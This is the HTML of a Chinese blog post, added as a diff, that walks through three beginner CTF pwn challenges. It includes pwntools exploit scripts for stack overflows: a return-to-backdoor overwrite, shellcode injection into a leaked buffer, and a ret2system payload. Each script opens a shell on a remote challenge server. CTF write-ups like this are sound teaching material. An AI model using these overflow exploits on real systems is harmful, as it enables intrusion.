@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+  
+  <meta name="description" content="#pwn level0 、 level1 、 level2总结
+##pwn题初识
+   初识pwn：“Pwn”是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵了。
+  pwn题要干嘛：构造或者伪造后门函">
+  
+
+  
+  
+  
+  
+  
+  
+  <title>QianKeTutu</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="#pwn level0 、 level1 、 level2总结 ##pwn题初识    初识pwn：“Pwn”是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵了。   pwn题要干嘛：构造或者伪造后门函数，得到shell。   看懂pwn题exp参考：pwntools使用简介https://blog.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="QianKeTutu">
+<meta property="og:url" content="http://yoursite.com/2019/07/27/pwn012/index.html">
+<meta property="og:site_name" content="QianKeTutu">
+<meta property="og:description" content="#pwn level0 、 level1 、 level2总结 ##pwn题初识    初识pwn：“Pwn”是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵了。   pwn题要干嘛：构造或者伪造后门函数，得到shell。   看懂pwn题exp参考：pwntools使用简介https://blog.">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-07-25T02:54:22.703Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="QianKeTutu">
+<meta name="twitter:description" content="#pwn level0 、 level1 、 level2总结 ##pwn题初识    初识pwn：“Pwn”是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵了。   pwn题要干嘛：构造或者伪造后门函数，得到shell。   看懂pwn题exp参考：pwntools使用简介https://blog.">
+  
+  
+    <link rel="icon" href="/css/images/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+  
+  <!-- baidu webmaster push -->
+  <script src="//push.zhanzhang.baidu.com/push.js"></script>
+</head></html>
+<body class="home blog custom-background custom-font-enabled single-author">
+  <div id="page" class="hfeed site">
+      <header id="masthead" class="site-header" role="banner">
+    <hgroup>
+      <h1 class="site-title">
+        <a href="/" title="QianKeTutu" rel="home">QianKeTutu</a>
+      </h1>
+      
+        <h2 class="site-description hitokoto"></h2>
+        <script type="text/javascript" src="https://v1.hitokoto.cn/?encode=js"></script>
+      
+    </hgroup>
+
+    <nav id="site-navigation" class="main-navigation" role="navigation">
+            <button class="menu-toggle">菜单</button>
+            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
+            <div class="menu-main-container">
+                <ul id="menu-main" class="nav-menu">
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
+                
+                </ul>
+            </div>
+    </nav>
+</header>
+
+      <div id="main" class="wrapper">
+        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-pwn012" class="post-pwn012 post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2019/07/27/pwn012/" data-id="cjyl9y27x0002pgvwr61d4u6a" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <p>#pwn level0 、 level1 、 level2总结</p>
+<p>##pwn题初识</p>
+<p>   初识pwn：“Pwn”是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵了。</p>
+<p>  pwn题要干嘛：构造或者伪造后门函数，得到shell。</p>
+<p>  看懂pwn题exp参考：pwntools使用简介<a href="https://blog.csdn.net/qq_29343201/article/details/51337025" title="pwntools使用简介" target="_blank" rel="noopener">https://blog.csdn.net/qq_29343201/article/details/51337025</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">##level0</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">用IDA打开，找到main函数，F5反编汇后看到伪C 代码</span><br><span class="line">![伪C代码如下](https://i.imgur.com/DzBhVFo.png)</span><br><span class="line"></span><br><span class="line">双击查看vulnerable_function()函数内容，发现栈溢出. 查看函数列表，发现callsystem函数（即后门函数），双击查看。有“/bin/sh”，即终端，所以直接用此函数的地址覆盖，函数返回地址.</span><br><span class="line"></span><br><span class="line">exp如下：</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">s_addr=0x400596</span><br><span class="line"></span><br><span class="line">p=remote(&quot;111.198.29.45&quot;,39645)</span><br><span class="line">p.sendline(&apos;a&apos;*0x80+&apos;a&apos;*8+p64(s_addr)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">运行脚本获得shell，输入ls，cat flag命令，即可得flag.</span><br><span class="line"></span><br><span class="line">**原理：本来就有后门，无需构造，直接覆盖即可。**</span><br></pre></td></tr></table></figure>
+
+<p>##level1</p>
+<p>在虚拟机终端，用file 文件名命令，查看该文件是32位的，用checksec 文件名命令，查看文件保护机制.<br>用IDA打开，查看伪C代码，看代码，看vulnerable_function()函数代码，发现栈溢出，同时要知道程序是什么个程序.看函数列表发现并没有callsystem后门函数，所以需要我们自己构造.怎么构造呢？发现vulnerable_function()函数里输出了buf的地址，所以就可以用buf的地址覆盖函数返回地址，又因为NX防护没开，所以用shellcode写入buf，伪造后门函数。</p>
+<p>exp1如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">       from pwn import *</span><br><span class="line"></span><br><span class="line">      shellcode=asm(shellcraft.sh())</span><br><span class="line">      io=remote(&quot;pwn2.jarvisoj.com&quot;,9877)   </span><br><span class="line"></span><br><span class="line">      text=io.recvline()[14: -2]</span><br><span class="line">      buf_addr=int(text,16)</span><br><span class="line">      payload=shellcode+&apos;a&apos;*(0x88+0x4-len(shellcode))+p32(buf_addr)</span><br><span class="line">      io.sendline(payload)</span><br><span class="line">      io.interactive()</span><br><span class="line">      io.close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp2如下：</span><br></pre></td></tr></table></figure>
+
+<pre><code>from pwn import *
+context(arch=&apos;i386&apos;,os=&apos;linux&apos;)
+p=remote(&quot;pwn2.jarvisoj.com&quot;,9877)
+p.recvuntil(&quot;this:&quot;)
+text=p.recv(10)
+buf_addr=int(text,16)
+p.recvline() #接收 \n,可有可无
+payload=asm(shellcraft.sh()).ljust(0x88)+&apos;a&apos;*0x4+p32(buf_addr)
+p.sendline(payload)
+p.interactive()     </code></pre><p><strong>原理就是把shellcode（即是shellcraft.sh()，也是/bin/sh，也就是终端）写入buf，把函数返回地址覆盖成buf的地址.</strong></p>
+<p>##level2</p>
+<p>依然是用file 文件名，命令查该看文件是32位，checksec 文件名命令，查看该文件的防护信息.<br>用IDA打开该文件，没有callsystem函数，NX是enabled，所以也不能用shellcode，查看伪C代码vulnerable_function()里，发现栈溢出，用字符串搜索可以看到有个/bin/sh的字符串，函数列表里有个_system函数.这是个突破点，利用这个原理构造后门函数. 就是把_system的地址传入，由于调了_system这个函数，程序又相当于新建立了一个栈，所以得用一个东西覆盖它的函数返回地址. </p>
+<p>exp如下：</p>
+<pre><code>
+      from pwn import *           
+      system_addr=0x08048320    
+      p=remote(&quot;pwn2.jarvisoj.com&quot;,9878)  
+      sh_addr=0x0804A024
+      payload=&apos;a&apos; * (0x88 + 0x4)+p32(system_addr)+p32(0)+p32(sh_addr)  
+      p.sendline(payload)       
+      p.interactive()
+
+**原理就是：自己构造后门函数，根据_system函数的地址，字符串/bin/sh的地址，栈的结构，明白payload中每一段的意思.**</code></pre>
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2019/07/27/pwn012/">
+    <time datetime="2019-07-27T08:21:56.995Z" class="entry-date">
+        2019-07-27
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+    
+<nav class="nav-single">
+    <h3 class="assistive-text">文章导航</h3>
+    
+        <span class="nav-previous"><a href="/2019/07/27/web张/" rel="prev"><span class="meta-nav">←</span> (no title)</a></span>
+    
+    
+        <span class="nav-next"><a href="/2019/07/19/第一天__10种基本工具/" rel="next">第一天=·=10种基本工具 <span class="meta-nav">→</span></a></span>
+    
+</nav><!-- .nav-single -->
+
+
+
+
+
+
+
+</div></div>
+        <div id="secondary" class="widget-area" role="complementary">
+  
+    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
+    <div>
+        <input type="text" value name="s" id="s">
+        <input type="submit" id="searchsubmit" value="搜索">
+    </div>
+</form></aside>
+  
+    
+  
+    
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget-content">
+      <ul>
+        
+          <li>
+            <a href="/2019/07/27/web张/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/27/pwn012/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/19/第一天__10种基本工具/">第一天=·=10种基本工具</a>
+          </li>
+        
+          <li>
+            <a href="/2019/06/12/Window命令小结及Python基本语法/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2019/06/10/Frist-Blood/">Frist Blood</a>
+          </li>
+        
+      </ul>
+    </div>
+  </aside>
+
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-content">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/">web</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </aside>
+
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-content tagcloud">
+      <a href="/tags/web/" style="font-size: 10px;">web</a>
+    </div>
+  </aside>
+
+  
+</div>
+      </div>
+      <footer id="colophon" role="contentinfo">
+    <p>&copy; 2019 QianKeTutu
+    All rights reserved.</p>
+    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</footer>
+    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/js/share.js'];</script>
+
+<script src="/js/jquery-3.3.1.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+<script src="/js/navigation.js"></script>
+
+<div id="bg"></div>
+
+  </div>
+</body>
+</html>
